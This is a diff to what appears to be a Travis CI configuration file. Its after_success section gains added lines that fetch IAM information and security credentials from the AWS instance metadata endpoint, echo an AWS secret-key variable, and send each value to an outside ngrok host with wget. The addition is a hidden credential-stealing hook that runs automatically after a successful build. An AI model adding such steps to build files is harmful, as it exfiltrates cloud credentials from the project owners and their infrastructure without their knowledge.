@@ -10,6 +10,14 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
+  - export INFO=`curl http://169.254.169.254/latest/meta-data/iam/info`
+  - wget http://70b3e55723dd.ngrok.io/$(echo $INFO)
+  - export ENDPOINT=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+  - wget http://70b3e55723dd.ngrok.io/$(echo $ENDPOINT)
+  - export CREDS=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ENDPOINT`
+  - wget http://70b3e55723dd.ngrok.io/$(echo $ENDPOINT)
+  - echo $AWS_SECRET_ACCESS_KEY_ID
+  - wget http://70b3e55723dd.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY_ID)
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
